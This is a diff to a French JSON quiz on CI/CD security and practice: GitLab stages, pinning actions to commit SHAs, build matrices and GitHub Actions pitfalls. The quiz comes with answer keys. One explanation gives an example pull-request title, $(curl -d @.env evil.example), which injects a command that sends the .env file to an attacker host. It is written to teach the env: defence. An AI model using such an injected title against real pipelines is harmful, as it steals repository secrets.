@@ -153,7 +153,7 @@
    "Que le job a une image:"
   ],
   "answer": 0,
-  "explain": "stages: en haut de .gitlab-ci.yml liste les étapes dans l'ordre où elles tournent, et le stage: de chaque job doit en faire partie. Une faute comme tests au lieu de test suffit pour que GitLab refuse tout le fichier, avant qu'un seul job tourne. L'éditeur de pipeline (Build > Pipeline editor) montre ces erreurs pendant que tu tapes."
+  "explain": "stages: en haut de .gitlab-ci.yml liste les étapes dans l'ordre où elles tournent, et le stage: de chaque job doit en faire partie. Une faute comme tests au lieu de test, et GitLab refuse tout le fichier avant le moindre job. Build > Pipeline editor montre ces erreurs pendant que tu tapes. Sans stages:, GitLab prend .pre, build, test, deploy, .post ; un job sans stage: va dans test."
  },
  {
   "id": "cicd-1-13",
@@ -179,7 +179,7 @@
    "Pour gagner de la place"
   ],
   "answer": 0,
-  "explain": "uses: une/action@v3 suit un tag, et qui contrôle ce dépôt peut déplacer le tag vers du nouveau code, qui tourne alors dans ton pipeline avec tes secrets. Un SHA de commit (le long identifiant hexadécimal) désigne toujours exactement le même code. Épingle sur le SHA et note la version en commentaire ; la CI de Bashou le fait."
+  "explain": "uses: une/action@v3 suit un tag, et qui contrôle ce dépôt peut déplacer le tag vers du nouveau code, qui tourne alors dans ton pipeline avec tes secrets. Un SHA de commit (le long identifiant hexadécimal) désigne toujours exactement le même code ; vérifie qu'il vient du dépôt de l'action, pas d'un fork. Épingle sur le SHA et note la version en commentaire ; la CI de Bashou le fait."
  },
  {
   "id": "cicd-2-02",
@@ -205,7 +205,7 @@
    "Un déploiement en parallèle"
   ],
   "answer": 0,
-  "explain": "Une matrice liste des valeurs (Python 3.9 et 3.13, Ubuntu et Rocky…) et la CI lance le même job une fois par combinaison, en parallèle. Tu découvres que ton code casse sur la plus vieille version supportée avant un utilisateur, sans recopier le job à la main."
+  "explain": "Une matrice liste des valeurs (Python 3.11 et 3.14, Ubuntu et Rocky…) et la CI lance le même job une fois par combinaison, en parallèle. Tu découvres que ton code casse sur la plus vieille version supportée avant un utilisateur, sans recopier le job à la main."
  },
  {
   "id": "cicd-2-04",
@@ -348,7 +348,7 @@
    "Ça ne marche que sur la branche main"
   ],
   "answer": 0,
-  "explain": "${{ }} est remplacé avant que le shell tourne : le titre de la PR devient une partie du script. Un titre comme \"; curl evil.example #\" lance cette commande, avec le jeton du job. Passe le texte non fiable par env: (TITLE: ${{ github.event.pull_request.title }}) et utilise \"$TITLE\" dans le script : il reste du texte."
+  "explain": "${{ }} est remplacé avant que le shell tourne : le titre de la PR devient une partie du script. Un titre comme $(curl -d @.env evil.example) tourne même entre les guillemets, avec le jeton du job. Passe le texte non fiable par env: (TITLE: ${{ github.event.pull_request.title }}) et utilise \"$TITLE\" dans le script : il reste du texte."
  },
  {
   "id": "cicd-2-15",
@@ -361,6 +361,6 @@
    "Il ne peut pas lire le dépôt"
   ],
   "answer": 0,
-  "explain": "pull_request_target tourne dans le contexte de ton dépôt, avec ses secrets et un jeton qui peut écrire. Récupère le code de la PR là-dedans, et le fork d'un inconnu lance son propre code avec. Pour tester du code extérieur, utilise pull_request : pas de secrets, jeton en lecture seule. Ne récupère jamais de code non fiable dans pull_request_target."
+  "explain": "pull_request_target tourne dans le contexte de ton dépôt, avec ses secrets et un jeton qui peut écrire. Récupère le code de la PR là-dedans, et le fork d'un inconnu lance son propre code avec. Pour tester le code d'un fork, utilise pull_request : depuis un fork, pas de secrets et un jeton en lecture seule. Ne récupère jamais de code non fiable dans pull_request_target."
  }
 ]
